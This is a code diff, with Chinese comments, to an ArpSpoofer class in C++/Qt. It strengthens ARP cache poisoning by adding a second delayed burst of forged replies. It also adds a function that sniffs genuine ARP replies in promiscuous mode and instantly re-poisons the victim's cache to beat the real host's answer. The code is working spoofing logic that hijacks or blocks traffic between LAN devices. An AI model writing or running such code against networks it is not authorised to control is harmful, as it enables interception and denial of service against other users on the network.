@@ -526,7 +526,15 @@ bool ArpSpoofer::answerIsolationArp(const QByteArray &frame, quint32 subnetBase,
             buildArpReply(senderMac, m_localMac, m_localMac, tpaBytes, senderMac, senderIp);
     m_endpoint->send(reply);
     m_endpoint->send(reply);
+    // 与 answerGatewayArp 对齐：5ms + 18ms 两拍补帧。之前只补了 5ms 那一发，对真实主机偏弱
+    // ——真机抓包实测真主机硬件应答比我们早约 77µs，一发抢答赢不稳。两拍延迟重盖把它压回去。
     QTimer::singleShot(kAnswerBurstDelay1Ms, this, [this, reply, senderMac] {
+        if (m_endpoint && m_isolated.contains(senderMac)) {
+            m_endpoint->send(reply);
+            m_endpoint->flushTx();
+        }
+    });
+    QTimer::singleShot(kAnswerBurstDelay2Ms, this, [this, reply, senderMac] {
         if (m_endpoint && m_isolated.contains(senderMac)) {
             m_endpoint->send(reply);
             m_endpoint->flushTx();
@@ -576,4 +584,56 @@ void ArpSpoofer::healIsolation(const QByteArray &victimMac6)
     }
     if (!targets.isEmpty())
         m_endpoint->flushTx();
+}
+
+// ★ 反制真实主机的抢先应答 —— 这才是隔离对真实对端能不能稳的关键。
+//
+//   抓包实证：被隔离设备 A 广播 who-has <真实主机 B> 时，B 硬件直接回 reply、比我们早约 77µs
+//   （我们要经 收帧→用户态判定→回帧 一整圈）。光靠 answerIsolationArp 的「一问抢答」压不住，
+//   A 的缓存于是时有时无。但 **B 那条抢先的 reply 我们在混杂模式下也收得到** —— 收到就立刻
+//   把「B 在本机」重投一遍盖回去，正如 answerGatewayArp/reassertNow 反制真网关的解毒 ARP。
+//
+//   返回是否反制了（调用方据此决定要不要打诊断）。只处理「op=reply、spa=某个被隔离目标、
+//   目的 MAC = 某台被隔离设备」的帧；别的 reply 一律不碰。
+bool ArpSpoofer::counterIsolationReply(const QByteArray &frame)
+{
+    if (!m_endpoint || m_isoAnswered.isEmpty() || frame.size() < 42)
+        return false;
+    const uchar *f = reinterpret_cast<const uchar *>(frame.constData());
+    if (f[12] != 0x08 || f[13] != 0x06)            // ARP
+        return false;
+    if (f[20] != 0x00 || f[21] != 0x02)            // 只看 reply
+        return false;
+    const QByteArray sha(reinterpret_cast<const char *>(f + 22), 6); // 应答者 MAC
+    if (sha == m_localMac)
+        return false;                              // 我们自己发的抢答，别自反制
+    const QByteArray ethDst(reinterpret_cast<const char *>(f + 0), 6); // 这条 reply 发给谁
+    // 目的必须是某台被隔离设备（真主机的 solicited reply 单播给发问的 A）。
+    if (!m_isolated.contains(ethDst))
+        return false;
+    const quint32 spa = (quint32(f[28]) << 24) | (quint32(f[29]) << 16)
+                        | (quint32(f[30]) << 8) | quint32(f[31]); // 应答者 IP = 被争夺的目标
+    // 这个目标确实是我们正为这台设备接管的？（避免对无关 reply 乱投）
+    const QHash<quint32, qint64> &targets = m_isoAnswered.value(ethDst);
+    if (!targets.contains(spa))
+        return false;
+    // 顺手把真相记下来：这条 reply 里就有目标的真实 MAC，转发路径要用（省一次 resolveLanPeer）。
+    learnLanMac(spa, sha);
+
+    // 立刻重投「目标在本机」盖回 A 的缓存。
+    //   sender = 本机MAC / 目标IP(spa)     → 「目标在我这」
+    //   target = A 的 MAC / A 的 IP        → 这条 reply 明确回给 A
+    // A 的 IP 就在 B 那条 reply 的 target 字段（f[38..41]），A 的 MAC = ethDst。
+    QByteArray spaBytes(4, char(0));
+    spaBytes[0] = char((spa >> 24) & 0xFF);
+    spaBytes[1] = char((spa >> 16) & 0xFF);
+    spaBytes[2] = char((spa >> 8) & 0xFF);
+    spaBytes[3] = char(spa & 0xFF);
+    const QByteArray aIp(reinterpret_cast<const char *>(f + 38), 4);
+    const QByteArray reassert =
+            buildArpReply(ethDst, m_localMac, m_localMac, spaBytes, ethDst, aIp);
+    m_endpoint->send(reassert);
+    m_endpoint->send(reassert);
+    m_endpoint->flushTx();
+    return true;
 }
